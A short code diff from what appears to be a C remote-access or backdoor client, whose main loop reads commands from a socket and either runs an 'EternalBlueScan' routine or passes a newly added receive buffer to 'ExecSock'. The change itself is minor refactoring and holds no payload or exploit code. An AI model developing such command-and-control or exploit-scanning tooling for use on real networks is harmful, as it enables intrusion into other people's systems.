@@ -19,6 +19,7 @@ int fsize = 0;
 char* fileinfo[3];
 char temp[BUFFER]; // Temporary buffer to receive file information
 
+char recvbuf[BUFFER];
 
 // Declare local, PAss parameter
 struct sockaddr_in server;
@@ -485,7 +486,7 @@ void fhdawn_main(void)
             EternalBlueScan(fileinfo[1]); 
         }
         else {
-            ExecSock(sockfd);
+            ExecSock(sockfd, recvbuf);
         }
 
     }
